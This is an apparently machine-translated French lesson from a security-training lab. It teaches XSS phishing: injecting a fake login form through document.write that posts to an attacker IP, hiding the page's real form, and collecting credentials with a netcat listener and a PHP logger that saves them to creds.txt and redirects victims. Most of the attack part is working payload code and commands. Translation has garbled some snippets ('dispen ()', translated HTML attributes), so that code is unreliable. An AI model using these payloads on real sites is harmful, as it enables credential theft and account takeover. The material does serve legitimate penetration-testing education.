Hameçonnage
========

* * * * *

Un autre type très courant d'attaque XSS est une attaque de phishing. Les attaques de phishing utilisent généralement des informations légitimes pour inciter les victimes à envoyer leurs informations sensibles à l'attaquant. Une forme courante d'attaques de phishing XSS consiste à injecter de faux formulaires de connexion qui envoient les détails de connexion au serveur de l'attaquant, qui peut ensuite être utilisé pour se connecter au nom de la victime et prendre le contrôle de leur compte et des informations sensibles.

En outre, supposons que nous devions identifier une vulnérabilité XSS dans une application Web pour une organisation particulière. Dans ce cas, nous pouvons utiliser une telle attaque comme exercice de simulation de phishing, qui nous aidera également à évaluer la sensibilisation à la sécurité des employés de l'organisation, surtout s'ils font confiance à l'application Web vulnérable et ne s'attendent pas à ce qu'elle leur nuise.

* * * * *

Découverte XSS
-------------

Nous commençons par tenter de trouver la vulnérabilité XSS dans l'application Web à `/ phishing» à partir du serveur à la fin de cette section. Lorsque nous visitons le site Web, nous voyons qu'il s'agit d'une simple visionneuse d'images en ligne, où nous pouvons saisir une URL d'une image, et elle l'affichera:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)

Cette forme de téléspectateurs d'images est courante dans les forums en ligne et les applications Web similaires. Comme nous avons le contrôle de l'URL, nous pouvons commencer par utiliser la charge utile XSS de base que nous utilisons. Mais lorsque nous essayons cette charge utile, nous voyons que rien n'est exécuté et que nous obtenons l'icône de «URL d'image morte:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)

Nous devons donc exécuter le processus de découverte XSS que nous avons précédemment appris à trouver une charge utile XSS fonctionnelle. «Avant de continuer, essayez de trouver une charge utile XSS qui exécute avec succès le code JavaScript sur la page».

Conseil: Pour comprendre quelle charge utile devrait fonctionner, essayez de voir comment votre entrée est affichée dans la source HTML après l'avoir ajouté.

* * * * *

Injection de formulaire de connexion
--------------------

Une fois que nous avons identifié une charge utile XSS fonctionnelle, nous pouvons passer à l'attaque de phishing. Pour effectuer une attaque de phishing XSS, nous devons injecter un code HTML qui affiche un formulaire de connexion sur la page ciblée. Ce formulaire devrait envoyer les informations de connexion à un serveur sur lequel nous écoutons, de sorte qu'une fois qu'un utilisateur tente de se connecter, nous obtiendrions ses informations d'identification.

Nous pouvons facilement trouver un code HTML pour un formulaire de connexion de base, ou nous pouvons écrire notre propre formulaire de connexion. L'exemple suivant doit présenter un formulaire de connexion:

Code: HTML

```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Dans le code HTML ci-dessus, `our_ip` est l'IP de notre machine virtuelle, que nous pouvons trouver avec la commande (` ip a`) sous `tun0`. Nous écouterons plus tard sur cette IP pour récupérer les informations d'identification envoyées du formulaire. Le formulaire de connexion doit ressembler à la suivante:

Code: HTML

```
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>

```

Ensuite, nous devons préparer notre code XSS et le tester sur le formulaire vulnérable. Pour écrire du code HTML sur la page vulnérable, nous pouvons utiliser la fonction JavaScript `document.write ()`, et l'utiliser dans la charge utile XSS que nous avons trouvée plus tôt dans l'étape de découverte XSS. Une fois que nous minifons notre code HTML en une seule ligne et l'ajoutons à l'intérieur de la fonction «écriture», le code JavaScript final devrait être le suivant:

Code: JavaScript

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Nous pouvons maintenant injecter ce code JavaScript en utilisant notre charge utile XSS (c'est-à-dire au lieu d'exécuter le code JavaScript `alert (window.origin). Dans ce cas, nous exploitons une vulnérabilité `` reflétée XSS ', afin que nous puissions copier l'URL et notre charge utile XSS dans ses paramètres, comme nous l'avons fait dans la section «XSS» réfléchie, et la page devrait ressembler à ce qui suit lorsque nous Visitez l'URL malveillante:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg)

* * * * *

Nettoyer
-----------

Nous pouvons voir que le champ URL est toujours affiché, ce qui bat notre ligne de "'Veuillez vous connecter pour continuer'". Donc, pour encourager la victime à utiliser le formulaire de connexion, nous devons supprimer le champ URL, de sorte qu'ils peuvent penser qu'ils doivent se connecter pour pouvoir utiliser la page. Pour ce faire, nous pouvons utiliser la fonction JavaScript `Document.getElementyId (). Suppter ()` Fonction.

Pour trouver le `id` de l'élément HTML que nous voulons supprimer, nous pouvons ouvrir le` Page Inspector Picker 'en cliquant sur [`Ctrl + Shift + C`] puis en cliquant sur l'élément dont nous avons besoin :
![PAGE Inspector Picker](https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg)

Comme nous le voyons à la fois dans le code source et le texte de survol, le formulaire `URL` a l'ID` Urlform`:

Code: HTML

```
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Ainsi, nous pouvons désormais utiliser cet ID avec la fonction `retire ()` pour supprimer le formulaire URL:

Code: JavaScript
```
document.getElementById ('Urlform'). Remove ();

```

Maintenant, une fois que nous ajouterons ce code à notre précédent code JavaScript (après la fonction «document.write`), nous pouvons utiliser ce nouveau code JavaScript dans notre charge utile:

Code: JavaScript

```
document.write ('<h3> Veuillez vous connecter pour continuer </h3> <formulaire Action = http: // our_ip> <input type = "username" name = "username" placeholder = "username"> <input type = "mot de passe "name =" mot de passe "placeholder =" mot de passe "> <input type =" soumide "name =" soumi "value =" login "> </ form> '); document.getElementById (' urlform '). dispen ();
```

Lorsque nous essayons d'injecter notre code JavaScript mis à jour, nous voyons que le formulaire URL n'est en effet plus affiché:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg)

Nous voyons également qu'il reste un morceau du code HTML d'origine après notre formulaire de connexion injecté. Cela peut être supprimé en le commentant simplement, en ajoutant un commentaire d'ouverture HTML après notre charge utile XSS:

Code: HTML

```
... PAYLOAD ... <! -

```

Comme nous pouvons le voir, cela supprime le morceau restant du code HTML d'origine, et notre charge utile doit être prête. La page semble maintenant légitimement nécessite une connexion:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)

Nous pouvons désormais copier l'URL finale qui devrait inclure la charge utile entière, et nous pouvons l'envoyer à nos victimes et tenter de les inciter à utiliser le faux formulaire de connexion. Vous pouvez essayer de visiter l'URL pour vous assurer qu'il affichera le formulaire de connexion comme prévu. Essayez également de vous connecter au formulaire de connexion ci-dessus et voyez ce qui se passe.

* * * * *

Vol d'identification
-------------------

Enfin, nous arrivons à la partie où nous volons les informations d'identification de connexion lorsque la victime tente de se connecter à notre formulaire de connexion injecté. Si vous essayez de vous connecter au formulaire de connexion injecté, vous obtiendrez probablement l'erreur «Ce site ne peut pas être atteint». En effet, comme mentionné précédemment, notre formulaire HTML est conçu pour envoyer la demande de connexion à notre IP, qui devrait écouter une connexion. Si nous n'écoutons pas une connexion, nous obtiendrons une erreur de «site ne peut pas être atteinte».

Alors, commençons un simple serveur `NetCAT» et voyons quel type de demande nous recevons lorsque quelqu'un tente de se connecter via le formulaire. Pour ce faire, nous pouvons commencer à écouter sur le port 80 dans notre PWNBOX, comme suit:

```
dsgsec @ htb [/ htb] $ sudo nc -lvnp 80
écouter sur [n'importe quel] 80 ...
```

Maintenant, essayons de vous connecter avec les informations d'identification «Test: Test» et vérifiez la sortie «NetCat» que nous obtenons («N'oubliez pas de remplacer notre_IP dans la charge utile XSS par votre ip» réel »):

```
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

Comme nous pouvons le voir, nous pouvons capturer les informations d'identification dans l'URL de la demande HTTP (`/? Username = test & mot de passe = test`). Si une victime tente de se connecter avec le formulaire, nous obtiendrons ses informations d'identification.

Cependant, comme nous n'écoutons qu'avec un auditeur «Netcat», il ne gèrera pas correctement la demande HTTP et la victime obtiendrait une erreur «incapable de connecter», ce qui pourrait soulever des soupçons. Ainsi, nous pouvons utiliser un script PHP de base qui enregistre les informations d'identification de la demande HTTP, puis renvoie la victime à la page d'origine sans aucune injection. Dans ce cas, la victime peut penser qu'elle s'est connectée avec succès et utilisera la visionneuse d'images comme prévu.

Le script PHP suivant doit faire ce dont nous avons besoin, et nous l'écrire dans un fichier sur notre machine virtuelle que nous appellerons `index.php` et le placerons dans` / tmp / tmpServer / `(` n'oubliez pas de remplacer Server_ip avec l'IP à partir de notre exercice`):

Code: php

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Maintenant que nous avons notre fichier index.php »prêt, nous pouvons démarrer un serveur d'écoute` php », que nous pouvons utiliser au lieu de l'écouteur de base` NetCat »que nous avons utilisé plus tôt:

```
dsgsec@htb[/htb]$ mkdir /tmp/tmpserver
dsgsec@htb[/htb]$ cd /tmp/tmpserver
dsgsec@htb[/htb]$ vi index.php #at this step we wrote our index.php file
dsgsec@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Essayons de vous connecter au formulaire de connexion injecté et voyons ce que nous obtenons. Nous voyons que nous sommes redirigés vers la page d'image d'image d'origine:

![](https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg)

Si nous vérifions le fichier `Creds.txt` dans notre PWNNOX, nous voyons que nous avons obtenu les informations d'identification de connexion:

```
dsgsec@htb[/htb]$ cat creds.txt
Username: test | Password: test
```

Avec tout prêt, nous pouvons démarrer notre serveur PHP et envoyer l'URL qui inclut notre charge utile XSS à notre victime, et une fois qu'ils se connectent au formulaire, nous obtiendrons leurs informations d'identification et les utiliserons pour accéder à leurs comptes.